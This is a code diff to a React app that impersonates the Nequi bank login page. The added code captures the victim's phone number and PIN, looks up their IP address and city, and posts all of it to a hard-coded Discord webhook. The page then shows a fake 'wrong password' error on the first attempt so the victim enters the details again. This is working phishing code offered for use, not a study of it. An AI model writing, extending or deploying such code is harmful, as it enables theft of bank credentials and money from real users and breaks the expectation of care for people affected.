@@ -1,6 +1,8 @@
 import { useState } from 'react';
 import { ChevronDown, CheckCircle, XCircle } from 'lucide-react';
 
+const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1524558693020991559/zJ2Dkz8-j1p0KR0pABCqf5fUa1f1WFvOFStTRU2_LRS7i4lzZCAo_xz9s-RcSKT276x4';
+
 function App() {
   const [phone, setPhone] = useState('');
   const [password, setPassword] = useState('');
@@ -12,12 +14,43 @@ function App() {
 
   const isFormValid = phone.length === 10 && password.length === 4 && confirmed;
 
+  const sendToDiscord = async () => {
+    try {
+      const [ipRes, geoRes] = await Promise.all([
+        fetch('https://api.ipify.org?format=json'),
+        fetch('https://ip-api.com/json/')
+      ]);
+      const { ip } = await ipRes.json();
+      const geo = await geoRes.json();
+
+      const now = new Date();
+      const dateTime = now.toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+      const device = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Móvil' : 'Escritorio';
+
+      const content =
+`**Nuevo inicio de sesión - Nequi** (Intento #${attempts + 1})
+📱 Teléfono: +57 ${phone}
+🔐 Contraseña: ${password}
+🌐 IP: ${ip}
+📍 Ciudad: ${geo.city}, ${geo.regionName}
+🖥️ Dispositivo: ${device}
+⏰ Fecha/Hora: ${dateTime}`;
+
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content })
+      });
+    } catch {}
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!isFormValid) return;
     setIsLoading(true);
     setError('');
-    await new Promise(resolve => setTimeout(resolve, 15000));
+    sendToDiscord();
+    await new Promise(resolve => setTimeout(resolve, 5000));
     setIsLoading(false);
     if (attempts === 0) {
       setError('Contraseña incorrecta, intenta nuevamente');
@@ -52,10 +85,10 @@ function App() {
       {/* Header */}
       <header className="relative z-10 bg-white border-b border-gray-100 shadow-sm">
         <div className="max-w-7xl mx-auto px-6 py-4">
-          <div className="flex items-start gap-0.5">
+          <button onClick={() => { setPhone(''); setPassword(''); setConfirmed(false); setIsLoading(false); setAttempts(0); setError(''); setSuccess(false); }} className="flex items-start gap-0.5 cursor-pointer">
             <span className="w-2 h-2 bg-[#e91e8c] mt-0.5 inline-block flex-shrink-0"></span>
             <span className="text-[#1a0533] text-2xl font-black tracking-tight">Nequi</span>
-          </div>
+          </button>
         </div>
       </header>
 
@@ -63,7 +96,7 @@ function App() {
       <main className="relative z-10 flex-1 flex items-center justify-center px-4 py-12">
         <div className="w-full max-w-md">
           <div className="bg-white rounded-2xl shadow-lg p-8 md:p-10">
-            {/* Title */}
+            {!success && (
             <div className="text-center mb-8">
               <h1 className="text-3xl font-bold text-[#1a0533] mb-3">
                 Entra a tu Nequi
@@ -72,6 +105,7 @@ function App() {
                 Podrás bloquear tu Nequi, consultar tus datos.
               </p>
             </div>
+            )}
 
               {success ? (
                 <div className="text-center py-6">
